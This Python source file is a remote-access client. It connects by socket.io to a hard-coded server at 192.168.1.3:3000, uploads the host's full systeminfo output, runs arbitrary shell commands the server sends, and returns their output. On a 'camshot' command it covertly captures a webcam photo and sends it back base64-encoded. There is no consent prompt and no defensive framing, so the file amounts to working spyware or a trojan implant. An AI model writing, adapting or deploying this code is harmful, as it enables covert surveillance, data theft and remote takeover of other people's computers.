from socketio import Client
from platform import platform
from datetime import datetime
from subprocess import check_output,run,PIPE,DEVNULL
from sys import exit as EXIT
from cv2 import VideoCapture,imwrite,imencode
from base64 import b64encode



class Main:
    def __init__(self) -> None:
        self.sio = None

    #join room
    def joinRoom(self):
        systemInfo =""
        info = check_output(['systeminfo'],stderr=DEVNULL,stdin=DEVNULL,shell=True).decode('utf-8').split('\n')
        for item in info:
            systemInfo = systemInfo+item+"\n<br>"

        self.sio.emit('joinRoom',{"user":True,"os":platform(),"time":datetime.now().strftime('%Y-%m-%d %H:%M:%S'),"data":systemInfo})

    

        
    
    #capture img from webcam and return base64
    def captureImage(self):
        cap = VideoCapture(0)
        if not cap.isOpened():
            return "Error: Unable to access the camera."
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return"Error: Unable to capture image."
        _, img_encoded = imencode('.jpg', frame)
        base64_image = b64encode(img_encoded)
        
        return base64_image.decode('utf-8')


    #socket on event handle
    def socketConnection_On(self):
        #get command from server ,process and return data
        @self.sio.on('runcmd')
        def server_command(message):
            finalResult =""
            response_type ="n"
            command = message['cmd']
            splitted_command = command.split(" ")
            if splitted_command[0]=="exit":
                 self.sio.disconnect()
                 EXIT()
            elif splitted_command[0]=="camshot":
                response_type="p"
                finalResult=self.captureImage()
            else:
                try:
                    result = run(splitted_command,shell=True,stdout=PIPE, stderr=PIPE, text=True)
                    finalResult = result.stdout
                except Exception as e:
                        finalResult="Wrong Command"
             
            self.sio.emit('reply',{"to":message['from'],"result":finalResult,"type":response_type})
    
        #pingtest
        @self.sio.on('pingTest')
        def pingtest(data):
            admin = data["from"]
            self.sio.emit("pingReply",{"to":admin})

    #socket client Runner
    def run(self):
        self.sio =Client()
        self.sio.connect('http://192.168.1.3:3000') 
        self.joinRoom()
        self.socketConnection_On()

try:
    main = Main()
    main.run()
except Exception:
    print("erro")
